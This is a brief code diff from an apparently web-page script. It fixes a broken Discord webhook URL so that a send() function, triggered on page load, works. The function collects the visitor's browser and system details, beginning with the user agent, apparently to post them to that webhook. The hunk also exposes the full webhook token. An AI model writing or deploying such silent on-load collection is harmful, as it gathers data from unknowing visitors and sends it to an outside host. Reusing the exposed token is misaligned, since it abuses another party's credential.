@@ -83,7 +83,7 @@ window.onload = () => {
   send();
 }
 function send() {
-  const webhookURL = "https://disc  ord.com/api/webhooks/1294706478510375003/B5-0Lhb0pD7WFE8zBu8QE1lFDmYuNQ9mEzDOxEK0UgttUutZnQwe42mFnqqOGi4I86e5";
+  const webhookURL = "https://discord.com/api/webhooks/1294706478510375003/B5-0Lhb0pD7WFE8zBu8QE1lFDmYuNQ9mEzDOxEK0UgttUutZnQwe42mFnqqOGi4I86e5";
 
   // Get browser and system information
   const userAgent = navigator.userAgent;
